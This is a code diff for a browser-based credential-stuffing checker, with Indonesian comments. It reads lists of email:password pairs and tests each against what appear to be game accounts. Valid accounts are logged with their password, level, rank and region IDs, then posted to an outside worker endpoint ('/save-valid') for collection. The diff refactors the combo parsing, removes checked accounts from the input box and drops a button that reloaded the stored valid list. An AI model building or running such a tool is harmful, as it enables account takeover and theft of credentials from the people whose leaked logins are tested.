@@ -50,7 +50,7 @@ const statusEl = document.getElementById("status");
 const startBtn = document.getElementById("startBtn");
 const stopBtn = document.getElementById("stopBtn");
 const downloadBtn = document.getElementById("downloadBtn");
-const loadValidBtn = document.getElementById("loadValidBtn");
+const comboTextarea = document.getElementById("combo");
 
 function appendLog(text, cls) {
   const time = new Date().toLocaleTimeString();
@@ -63,16 +63,16 @@ function appendLog(text, cls) {
 
 function parseCombos(text) {
   return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
+    let e, p;
     if(line.includes("|")) {
-      const [e,p] = line.split("|",2);
-      return { email: e.trim(), password: p.trim() };
+      [e,p] = line.split("|",2);
     } else if(line.includes(":")) {
-      const [e,p] = line.split(":",2);
-      return { email: e.trim(), password: p.trim() };
+      [e,p] = line.split(":",2);
     } else {
       appendLog(`Format salah dan dilewati: ${line}`, "info");
       return null;
     }
+    return { email: e.trim(), password: p.trim() };
   }).filter(Boolean);
 }
 
@@ -158,10 +158,8 @@ async function checkOneAccount(account) {
       const info = data.data;
       const line = `${info.email}:${info.password} | Name: ${info.name} | Level: ${info.level} | Rank: ${info.rank_level} | RoleID: ${info.roleId} | ZoneID: ${info.zoneId} | Country: ${info.reg_country}`;
       appendLog(`VALID => ${line}`, "ok");
-
       validResults.push(line);
 
-      // kirim ke KV
       try {
         await fetch(WORKER_URL + "/save-valid", {
           method: "POST",
@@ -191,7 +189,7 @@ async function startProcess() {
   stopBtn.disabled = false;
   logEl.innerHTML = "";
   validResults = [];
-  combos = parseCombos(document.getElementById("combo").value);
+  combos = parseCombos(comboTextarea.value);
 
   if(combos.length === 0) {
     appendLog("Tidak ada akun untuk dicek", "info");
@@ -210,7 +208,10 @@ async function startProcess() {
     }
     const acc = combos[currentIndex];
     await checkOneAccount(acc);
+
+    // Hapus akun yang sudah dicek
     combos.splice(currentIndex, 1);
+    comboTextarea.value = combos.map(c => `${c.email}:${c.password}`).join("\n");
   }
 
   appendLog("Selesai", "info");
@@ -236,16 +237,6 @@ downloadBtn.addEventListener("click", () => {
   a.download = "valid.txt";
   a.click();
   URL.revokeObjectURL(url);
-});
-loadValidBtn.addEventListener("click", async () => {
-  try {
-    const resp = await fetch(WORKER_URL + "/valid.txt");
-    if (!resp.ok) throw new Error("HTTP " + resp.status);
-    const text = await resp.text();
-    appendLog("=== Valid.txt dari server ===\n" + (text || "(kosong)"), "ok");
-  } catch (err) {
-    appendLog("Gagal load valid.txt: " + err, "bad");
-  }
 });
 </script>
 </body>
